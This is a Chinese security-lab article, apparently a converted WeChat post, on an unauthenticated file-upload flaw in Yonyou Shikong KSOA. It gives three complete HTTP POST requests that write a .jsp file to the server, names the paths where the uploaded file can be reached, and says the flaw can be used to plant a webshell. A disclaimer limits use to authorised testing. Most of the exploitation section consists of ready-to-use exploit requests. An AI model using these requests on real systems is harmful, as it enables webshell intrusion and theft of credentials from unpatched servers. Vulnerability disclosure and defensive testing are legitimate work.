<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/JMS6Yzh6u__E0blcWVH30w)

**0x01 阅读须知**

**凯撒安全实验室的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**

**0x02 漏洞原理**

**该漏洞的原理在于用友时空设备开放了文件上传功能，但未鉴权且上传的文件类型、大小、格式、路径等方面进行严格的限制和过滤，导致攻击者可以通过构造恶意文件并上传到设备上，然后利用该漏洞获取权限并执行任意命令。攻击者有可能会上传一个包含 Webshell 的文件，通过 Webshell 来执行一系列操作，比如查看敏感信息、窃取设备管理员密码等。**

**0x03 漏洞利用**

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBstRNZ7hDbnM7c6bpjFEMOVb0WS6umP3HxPyxCJgRjKPWX74XULQsxLZDfIFQNMU55jPXkVXrbe7qA/640?wx_fmt=png)

漏洞 1url：

/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=kaisa.jsp

```
POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=kaisa.jsp HTTP/1.1
Host: xxxxxx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=8742C63AFFF1285584BA9D6C2C4B084B
Connection: close
Content-Length: 9
kaisa sec

```

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBstRNZ7hDbnM7c6bpjFEMOVbM9I5oKdTzPE4iahm34hXDJIMmefyfEicVtbhkzmts441ZOUic3xtstM6Q/640?wx_fmt=png)

访问地址：

url+/pictures/kaisa.jsp

漏洞 2url:

/servlet/com.sksoft.bill.Attachment?action=write&filename=kaisa.jsp

```
POST /servlet/com.sksoft.bill.Attachment?action=write&filename=kaisa.jsp HTTP/1.1
Host: xxxxxx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=4BA92D5702E7E76610D094A28FFA681F
Connection: close
Content-Length: 9
kaisa sec

```

返回包  

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBstRNZ7hDbnM7c6bpjFEMOVbUDEym56fWfBauf1YRj89ibM58HOC2enKtxPNicgbJ1z0RHusziaOEribaQ/640?wx_fmt=png)

访问地址:

url+/xxxxxxx/20230719161712-acb787-7ffa_1.jsp

漏洞 3url:

/webedit/upload.jsp

```
POST /webedit/upload.jsp HTTP/1.1 
Host: xxxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 
Accept-Encoding: gzip, deflate 
Connection: close 
Cookie: JSESSIONID=1BCCE820D72303DD853F829E3C2BECA0 
Upgrade-Insecure-Requests: 1 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCmMpFO7mjNFgl1Bz 
Content-Length: 262 
------WebKitFormBoundaryCmMpFO7mjNFgl1Bz 
Content-Disposition: form-data;  
/xxxxxxx/
------WebKitFormBoundaryCmMpFO7mjNFgl1Bz 
Content-Disposition: form-data;  
kaisa sec 
------WebKitFormBoundaryCmMpFO7mjNFgl1Bz--

```

公众号后台 KSOA2 即可获取漏洞 2 地址

零日 / 一日 漏洞探讨加 Seven_-0928

本实验室接受正规站点的授权渗透测试服务。如你的公司业务有 Web 渗透测试，高级渗透测试，红蓝对抗，黑客溯源，Java 代码审计等需求可联系以下微信进行商务洽谈：Xud330327

![](https://mmbiz.qpic.cn/mmbiz_jpg/fRWdakrtBssPEvyWSBIpUFH4FYbmxzwydudRibUP8icaLbZJQ5WmBNtmFzWU8x8avVw34FqSicxFsaQCSfveDUXibg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)